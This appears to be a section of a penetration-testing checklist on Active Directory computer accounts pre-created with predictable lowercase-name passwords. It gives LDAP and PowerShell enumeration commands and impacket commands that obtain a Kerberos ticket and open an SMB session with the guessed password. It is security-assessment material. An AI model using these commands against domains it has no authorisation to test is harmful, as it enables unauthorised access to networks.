## Pre-Windows 2000 computer accounts [t-ad-account_review-pre_windows_2000_accounts]

The **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name (DavesLaptop$ would have the password daveslaptop). If you do not select this check box, you are assigned a random password. It was commonly used for Remote Installation Services or Windows Deployment Services.
This means that if someone at one point in time created a computer account with this option set, and then never onboarded it (by joining it to the domain), you know the password for this account.
It shoud ve checked if it's possible to authenticate for those computer accounts using their name in lowercase as a password.


### References:

* [https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)

* [https://twitter.com/filip_dragovic/status/1524730451826511872](https://twitter.com/filip_dragovic/status/1524730451826511872)

### 5.1.1 Enumerate computer accounts with Pre-Windows 2000 Compatible Access attribure enabled.




**option 1: powershell_ad_module**

{% code overflow="wrap" %}
```bash
Get-ADObject -LDAPFilter "(&(userAccountControl=4128)(logonCount=0))"
```
{% endcode %}

{% hint style="info" %}You can add "| Measure-Object" to the powershell command to get a total number of the accounts.

It's better to filter out accounts which have been already onboarded (with logonCount > 0), since their password probably have been changed.

{% endhint %}


**option 2: ldapsearch**

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://<dc_ip> -D "<user@domain.com>" -w '<password>' -b "<DC=domain,DC=com>" "(&(userAccountControl=4128)(logonCount=0))" sAMAccountName | grep sAMAccountName
```
{% endcode %}

### 5.1.2 Try to authenticate for identified pre-windows 2000 computer accounts using computer names in lowercase as passwords



{% code overflow="wrap" %}
```bash
impacket-getTGT domain.com/pre2000\$:pre2000
KRB5CCNAME=pre2000\$.ccache impacket-smbclient -k -no-pass domain.com/pre2000\$@dc01.domain.com

```
{% endcode %}

